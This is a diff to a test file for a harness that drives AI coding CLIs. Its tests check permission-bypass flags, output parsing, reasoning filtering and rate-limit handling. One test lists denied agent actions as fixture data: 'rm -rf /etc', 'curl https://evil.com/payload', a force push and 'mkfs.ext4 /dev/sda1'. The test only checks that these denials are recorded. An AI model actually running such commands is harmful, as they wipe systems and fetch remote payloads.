@@ -87,6 +87,20 @@ describe('Pluggable Agent Harness Subsystem', () => {
       expect(inv.args).toContain(JSON.stringify({ permissions: { allow: ['command(npm test)'] } }));
     });
 
+    it('compiles stage arguments with --dangerously-skip-permissions for bypass mode', () => {
+      const inv = harness.compileStageArgs({
+        prompt: 'modify protected files',
+        stage: 'implement',
+        model: 'gemini-3.8-flash-high',
+        mode: 'bypassPermissions',
+        allowedCommands: [],
+      });
+
+      expect(inv.command).toBe('agy');
+      expect(inv.args).toContain('--dangerously-skip-permissions');
+      expect(inv.args).not.toContain('--mode');
+    });
+
     it('parses agy JSON output and captures denied actions', () => {
       const mockOut = {
         response: 'Done planning',
@@ -149,6 +163,20 @@ describe('Pluggable Agent Harness Subsystem', () => {
       expect(inv.args).toContain('--json');
     });
 
+    it('compiles stage arguments with --dangerously-bypass-approvals-and-sandbox for bypass mode', () => {
+      const inv = harness.compileStageArgs({
+        prompt: 'bypass test',
+        stage: 'implement',
+        model: 'o3-mini',
+        mode: 'bypassPermissions',
+        allowedCommands: [],
+      });
+
+      expect(inv.command).toBe('codex');
+      expect(inv.args).toContain('--dangerously-bypass-approvals-and-sandbox');
+      expect(inv.args).not.toContain('--approve-for-me');
+    });
+
     it('parses JSONL events and extracts text response', () => {
       const jsonl = [
         JSON.stringify({ type: 'start' }),
@@ -158,6 +186,50 @@ describe('Pluggable Agent Harness Subsystem', () => {
       const parsed = harness.parseOutput(jsonl, '');
       expect(parsed.text).toBe('Codex completed the refactor successfully.');
       expect(parsed.exitCode).toBe(0);
+    });
+
+    it('parses modern Codex CLI item.completed agent_message fixture', () => {
+      const fixturePath = path.resolve('test/fixtures/codex/assistant-message-modern.jsonl');
+      const fixtureContent = fs.readFileSync(fixturePath, 'utf8');
+
+      const parsed = harness.parseOutput(fixtureContent, '');
+      expect(parsed.text).toContain('Analyzing codebase and applying requested fixes.');
+      expect(parsed.text).toContain('Refactoring successfully completed across all target modules.');
+      expect(parsed.denials).toHaveLength(0);
+      expect(parsed.rateLimitedUntil).toBeNull();
+      expect(parsed.exitCode).toBe(0);
+    });
+
+    it('parses streaming deltas while filtering out internal reasoning chains', () => {
+      const fixturePath = path.resolve('test/fixtures/codex/reasoning-and-deltas.jsonl');
+      const fixtureContent = fs.readFileSync(fixturePath, 'utf8');
+
+      const parsed = harness.parseOutput(fixtureContent, '');
+      expect(parsed.text).toContain('Final synthesized response: all tests repaired and verified.');
+      expect(parsed.text).not.toContain('Internal reasoning chain');
+      expect(parsed.text).not.toContain('Let me think about');
+      expect(parsed.denials).toHaveLength(0);
+    });
+
+    it('parses diverse tool denial events from fixture', () => {
+      const fixturePath = path.resolve('test/fixtures/codex/tool-denial-variations.jsonl');
+      const fixtureContent = fs.readFileSync(fixturePath, 'utf8');
+
+      const parsed = harness.parseOutput(fixtureContent, '');
+      expect(parsed.denials.length).toBeGreaterThanOrEqual(4);
+      expect(parsed.denials.some(d => d.detail === 'rm -rf /etc')).toBe(true);
+      expect(parsed.denials.some(d => d.detail === 'curl https://evil.com/payload')).toBe(true);
+      expect(parsed.denials.some(d => d.detail === 'git push origin main --force')).toBe(true);
+      expect(parsed.denials.some(d => d.detail === 'mkfs.ext4 /dev/sda1')).toBe(true);
+    });
+
+    it('parses rate limit error events from fixture', () => {
+      const fixturePath = path.resolve('test/fixtures/codex/rate-limits-and-errors.jsonl');
+      const fixtureContent = fs.readFileSync(fixturePath, 'utf8');
+
+      const parsed = harness.parseOutput(fixtureContent, '');
+      expect(parsed.rateLimitedUntil).not.toBeNull();
+      expect(parsed.rateLimitedUntil!.getTime()).toBeGreaterThan(Date.now());
     });
   });
 
